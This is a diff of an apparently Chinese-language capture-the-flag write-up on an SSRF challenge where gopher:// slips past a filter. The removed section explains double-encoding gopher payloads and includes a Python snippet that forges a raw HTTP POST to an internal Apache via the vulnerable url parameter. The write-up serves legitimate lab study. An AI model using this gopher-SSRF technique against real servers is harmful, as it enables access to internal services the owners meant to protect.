@@ -23,27 +23,9 @@ if($url) {
 
 过滤只拦 `file` 和 `dict` 子串，`gopher://` 可用。
 
-## 关键坑：gopher 载荷要预编码（通用，可复用）
+## gopher 编码坑
 
-SSRF 的 PHP 会先对 `$_POST['url']` 做一次 URL 解码，再把结果交给 curl。所以 gopher 载荷里的
-空格/CRLF **必须预编码**（`%20`/`%0d%0a`，`&`→`%26`），否则：
-
-- 直接发原始空格/CRLF → PHP 解码成原始字节 → curl 无法解析 URL → `curl_exec` 返回空；
-- 裸 `&` → PHP 把它当 POST 参数分隔符，`url` 值被截断。
-
-正确做法（用 `httpx.post(data={'url': gopher})` 会自动把 `%` 再编码成 `%25`，正好是需要的双重编码）：
-
-```python
-import httpx
-from urllib.parse import quote
-inner = (f"POST / HTTP/1.1\r\nHost: 127.0.0.1\r\n"
-         f"Content-Type: application/x-www-form-urlencoded\r\n"
-         f"Content-Length: {len(body)}\r\n\r\n{body}")
-gopher = "gopher://127.0.0.1:80/_" + quote(inner, safe="")
-r = httpx.post(".../y0u_nev3r_gue5s_1t.php", data={"url": gopher})
-```
-
-这样 `curl` 会收到仍带 `%20`/`%0d%0a` 的 URL，解码后发原始 HTTP 请求。已验证能拿到内网 Apache 的原始响应。
+通用技术（载荷预编码 + 双重编码）已提炼到 [knowledge/techniques/web/gopher-ssrf.md](../knowledge/techniques/web/gopher-ssrf.md)，这里不重复。这道题专属的就一句：SSRF 点是 `POST /y0u_nev3r_gue5s_1t.php` 的 `url` 参数，用 gopher 打 `127.0.0.1:80` 的内网 Apache。
 
 ## 已通过的部分
 
